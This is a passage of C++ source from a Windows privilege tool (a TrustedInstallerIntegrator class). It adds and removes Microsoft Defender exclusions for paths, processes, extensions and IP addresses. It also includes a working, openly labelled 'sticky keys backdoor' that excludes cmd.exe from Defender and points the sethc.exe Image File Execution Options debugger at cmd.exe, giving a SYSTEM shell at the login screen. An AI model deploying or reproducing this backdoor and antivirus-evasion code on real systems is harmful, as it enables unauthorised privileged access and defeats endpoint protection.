    return AddDefenderExclusion(ExclusionType::Paths, path);
}

bool TrustedInstallerIntegrator::RemovePathExclusion(std::wstring_view path) {
    return RemoveDefenderExclusion(ExclusionType::Paths, path);
}

bool TrustedInstallerIntegrator::AddProcessExclusion(std::wstring_view processName) {
    return AddDefenderExclusion(ExclusionType::Processes, processName);
}

bool TrustedInstallerIntegrator::RemoveProcessExclusion(std::wstring_view processName) {
    return RemoveDefenderExclusion(ExclusionType::Processes, processName);
}

bool TrustedInstallerIntegrator::AddExtensionExclusion(std::wstring_view extension) {
    return AddDefenderExclusion(ExclusionType::Extensions, extension);
}

bool TrustedInstallerIntegrator::RemoveExtensionExclusion(std::wstring_view extension) {
    return RemoveDefenderExclusion(ExclusionType::Extensions, extension);
}

bool TrustedInstallerIntegrator::AddIpAddressExclusion(std::wstring_view ipAddress) {
    return AddDefenderExclusion(ExclusionType::IpAddresses, ipAddress);
}

bool TrustedInstallerIntegrator::RemoveIpAddressExclusion(std::wstring_view ipAddress) {
    return RemoveDefenderExclusion(ExclusionType::IpAddresses, ipAddress);
}

bool TrustedInstallerIntegrator::AddProcessToDefenderExclusions(std::wstring_view processName) {
    return AddProcessExclusion(processName);
}

bool TrustedInstallerIntegrator::RemoveProcessFromDefenderExclusions(std::wstring_view processName) {
    return RemoveProcessExclusion(processName);
}

bool TrustedInstallerIntegrator::AddToDefenderExclusions(std::wstring_view customPath)
{
    wchar_t currentPath[MAX_PATH];
    
    if (customPath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
            ERROR(L"Failed to get current module path");
            return false;
        }
    } else {
        if (customPath.length() >= MAX_PATH) {
            ERROR(L"File path too long");
            return false;
        }
        wcscpy_s(currentPath, MAX_PATH, std::wstring{customPath}.c_str());
    }

    fs::path filePath(currentPath);
    bool isExecutable = (filePath.extension().wstring() == L".exe");

    if (isExecutable) {
        return AddProcessExclusion(filePath.filename().wstring());
    } else {
        return AddPathExclusion(currentPath);
    }
}

bool TrustedInstallerIntegrator::RemoveFromDefenderExclusions(std::wstring_view customPath)
{
    wchar_t currentPath[MAX_PATH];
    
    if (customPath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
            ERROR(L"Failed to get current module path");
            return false;
        }
    } else {
        if (customPath.length() >= MAX_PATH) {
            ERROR(L"File path too long");
            return false;
        }
        wcscpy_s(currentPath, MAX_PATH, std::wstring{customPath}.c_str());
    }

    fs::path filePath(currentPath);
    bool isExecutable = (filePath.extension().wstring() == L".exe");

    if (isExecutable) {
        return RemoveProcessExclusion(filePath.filename().wstring());
    } else {
        return RemoveDefenderExclusion(ExclusionType::Paths, currentPath);
    }
}

// ============================================================================
// STICKY KEYS BACKDOOR
// ============================================================================

bool TrustedInstallerIntegrator::InstallStickyKeysBackdoor() noexcept
{
    INFO(L"Installing sticky keys backdoor with Defender bypass...");
    
    if (!AddProcessToDefenderExclusions(L"cmd.exe")) {
        INFO(L"AV exclusion skipped for cmd.exe (continuing)");
    }
    
    HKEY hKey;
    std::wstring keyPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";
    LONG result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, NULL, 
                                  REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    
    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to create IFEO registry key: %d", result);
        RemoveProcessFromDefenderExclusions(L"cmd.exe");
        return false;
    }
    
    std::wstring debuggerValue = L"cmd.exe";
    result = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, 
                           reinterpret_cast<const BYTE*>(debuggerValue.c_str()),
                           static_cast<DWORD>((debuggerValue.length() + 1) * sizeof(wchar_t)));
    
    RegCloseKey(hKey);
    
    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to set Debugger registry value: %d", result);
        RemoveProcessFromDefenderExclusions(L"cmd.exe");
        return false;
    }
    
    SUCCESS(L"Sticky keys backdoor installed successfully");
    SUCCESS(L"Press 5x Shift on login screen to get SYSTEM cmd.exe");
    return true;
}

bool TrustedInstallerIntegrator::RemoveStickyKeysBackdoor() noexcept
{
    INFO(L"Removing sticky keys backdoor...");
    
    bool success = true;
    
    std::wstring keyPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";
    LONG result = RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
    
    if (result != ERROR_SUCCESS && result != ERROR_FILE_NOT_FOUND) {
        ERROR(L"Failed to remove IFEO registry key: %d", result);
        success = false;
    } else if (result == ERROR_SUCCESS) {
        SUCCESS(L"IFEO registry key removed");
    }
    
    if (!RemoveProcessFromDefenderExclusions(L"cmd.exe")) {
        INFO(L"AV cleanup skipped for cmd.exe");
    }
    
    if (success) {
        SUCCESS(L"Sticky keys backdoor removed successfully");
    } else {
        INFO(L"Sticky keys backdoor removal completed with some errors");
    }
    
    return success;
}

// ============================================================================
// CONTEXT MENU INTEGRATION
// ============================================================================

bool TrustedInstallerIntegrator::AddContextMenuEntries()
{
    wchar_t currentPath[MAX_PATH];
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
    
    std::wstring command = L"\"";
    command += currentPath;
    command += L"\" trusted \"%1\"";
    
    std::wstring iconPath = L"shell32.dll,77";
    
    HKEY hKey;
    DWORD dwDisposition;
    
    // Context menu for executables
    if (RegCreateKeyExW(HKEY_CLASSES_ROOT, L"exefile\\shell\\RunAsTrustedInstaller", 0, NULL, REG_OPTION_NON_VOLATILE, 
                       KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
    {
        std::wstring menuText = L"Run as TrustedInstaller";
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)menuText.c_str(), 
                      (DWORD)(menuText.length() + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"Icon", 0, REG_SZ, (const BYTE*)iconPath.c_str(), 
                      (DWORD)(iconPath.length() + 1) * sizeof(wchar_t));
        
        HKEY hCommandKey;
        if (RegCreateKeyExW(hKey, L"command", 0, NULL, REG_OPTION_NON_VOLATILE, 
                           KEY_WRITE, NULL, &hCommandKey, &dwDisposition) == ERROR_SUCCESS)
        {
            RegSetValueExW(hCommandKey, NULL, 0, REG_SZ, (const BYTE*)command.c_str(), 
                          (DWORD)(command.length() + 1) * sizeof(wchar_t));
            RegCloseKey(hCommandKey);
        }
        
        RegCloseKey(hKey);
    }
    
    // Context menu for shortcuts
    if (RegCreateKeyExW(HKEY_CLASSES_ROOT, L"lnkfile\\shell\\RunAsTrustedInstaller", 0, NULL, REG_OPTION_NON_VOLATILE,
                       KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
    {
        std::wstring menuText = L"Run as TrustedInstaller";
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)menuText.c_str(),
                      (DWORD)(menuText.length() + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"Icon", 0, REG_SZ, (const BYTE*)iconPath.c_str(),
                      (DWORD)(iconPath.length() + 1) * sizeof(wchar_t));
        
        HKEY hCommandKey;
        if (RegCreateKeyExW(hKey, L"command", 0, NULL, REG_OPTION_NON_VOLATILE,
                           KEY_WRITE, NULL, &hCommandKey, &dwDisposition) == ERROR_SUCCESS)
        {
            RegSetValueExW(hCommandKey, NULL, 0, REG_SZ, (const BYTE*)command.c_str(),
                          (DWORD)(command.length() + 1) * sizeof(wchar_t));
            RegCloseKey(hCommandKey);
        }
        
        RegCloseKey(hKey);
    }
    
    SUCCESS(L"Context menu entries added");
    return true;
}

// ============================================================================
// HELPER UTILITIES
// ============================================================================

DWORD TrustedInstallerIntegrator::GetProcessIdByName(std::wstring_view processName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    DWORD pid = 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (std::wstring_view(pe.szExeFile) == processName) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

bool TrustedInstallerIntegrator::IsLnkFile(std::wstring_view path)
{
    if (path.length() < 4) return false;
    return (_wcsicmp(std::wstring{path.substr(path.length() - 4)}.c_str(), L".lnk") == 0);
}

std::wstring TrustedInstallerIntegrator::ResolveLnk(std::wstring_view lnkPath)
{
    IShellLinkW* pShellLink = nullptr;
    IPersistFile* pPersistFile = nullptr;
    wchar_t targetPath[MAX_PATH] = {0};

    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&pShellLink);
    if (FAILED(hr)) return L"";

    hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
    if (FAILED(hr)) {
        pShellLink->Release();
        return L"";
    }

    std::wstring lnkPathStr{lnkPath};
    hr = pPersistFile->Load(lnkPathStr.c_str(), STGM_READ);
    if (FAILED(hr)) {
        pPersistFile->Release();
        pShellLink->Release();
        return L"";
    }

    hr = pShellLink->GetPath(targetPath, MAX_PATH, NULL, 0);

    pPersistFile->Release();
    pShellLink->Release();

    return (SUCCEEDED(hr) && targetPath[0] != 0) ? std::wstring(targetPath) : L"";
}